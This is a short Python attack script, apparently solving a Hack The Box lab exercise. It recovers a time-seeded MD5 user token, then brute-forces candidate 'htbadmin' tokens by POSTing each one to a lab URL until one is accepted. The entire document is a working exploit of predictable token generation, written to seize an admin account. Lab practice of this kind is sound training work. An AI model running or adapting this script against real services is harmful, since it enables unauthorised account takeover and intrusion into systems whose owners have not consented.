from hashlib import md5
import requests
from sys import exit
import time
from tqdm import tqdm

website_token = 'ca16422a12367e85e653d57bbfc71022'

url = "http://94.237.55.75:59377/question1/"

# to have a wide window try to bruteforce starting from 120 seconds ago
now        = int(time.time() * 1000)
interval   = 100
start_time = now - (interval * 1000)
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    md5_token = md5(('htbuser' + str(x)).encode()).hexdigest()


    if website_token.lower() == md5_token.lower():
        print(f"Success, token is {md5_token}. Time is {x}")
        print(f"POSTing htbadmin token possibilities")

        for y in range(x - 1000, x+1001, 1):
            admin_token = md5(('htbadmin' + str(y)).encode()).hexdigest()
            data = {
                "submit": "check",
                "token": admin_token
            }
            res = requests.post(url, data=data)

                # response text check
            if not fail_text in res.text:
                print(res.text)
                print("[*] Congratulations! raw reply ^")
                print(f"Token was {admin_token}. Time was {y}")
                exit()
